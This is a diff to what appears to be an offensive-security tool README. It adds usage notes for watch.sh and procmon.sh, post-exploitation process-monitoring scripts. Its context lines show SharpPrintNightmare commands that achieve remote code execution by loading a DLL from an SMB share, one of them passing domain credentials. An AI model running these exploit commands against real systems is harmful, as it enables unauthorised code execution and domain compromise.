@@ -84,3 +84,10 @@ SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'
 #RCE using runas /netonly
 SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
  ```
+
+### watch.sh & procmon.sh
+In case we didn't get fully tty shell, watch.sh similar to watch and procmon.sh similar to pspy. Added time argument so script will stop in spesific time, by default script will stop at 300 seconds. 
+```
+./watch.sh <directory (default=.)> <time (default=300)>
+./procmon.sh <time (default=300)>
+```
